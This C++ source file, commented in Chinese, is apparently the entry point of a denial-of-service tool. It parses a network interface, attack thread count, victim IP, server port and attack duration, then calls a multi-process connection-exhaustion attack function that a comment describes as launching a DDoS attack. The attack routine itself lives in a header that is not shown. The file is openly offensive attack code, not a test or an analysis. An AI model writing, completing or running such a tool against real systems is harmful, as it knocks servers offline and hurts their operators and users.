#include <iostream>
#include "common.h"
#include "connection.h"

// globalArgs 初始化全局参数
GlobalArgs globalArgs = GlobalArgs();

// 解析命令行参数
void resolve_command_args(int argc, char** argv);

int main(int argc, char** argv) {

    // 解析命令行参数
    resolve_command_args(argc, argv);

    // 准备进行 ddos 攻击的发动
    connection_exhausted_attack_multiple_processes();

    return 0;
}

// 解析命令行参数
void resolve_command_args(int argc, char** argv){
    if (argc != 6) {
        std::cout << "Error Parameters (1. interface name | 2. attack thread count | 3. victim ip | 4. server port | 5. attack duration)" << std::endl;
        exit(-1);
    }
    CommandArgs commandArgs = CommandArgs(argv[1], atoi(argv[2]),
                                          argv[3], atoi(argv[4]),
                                          atoi(argv[5]));
    globalArgs.initialize(commandArgs);
}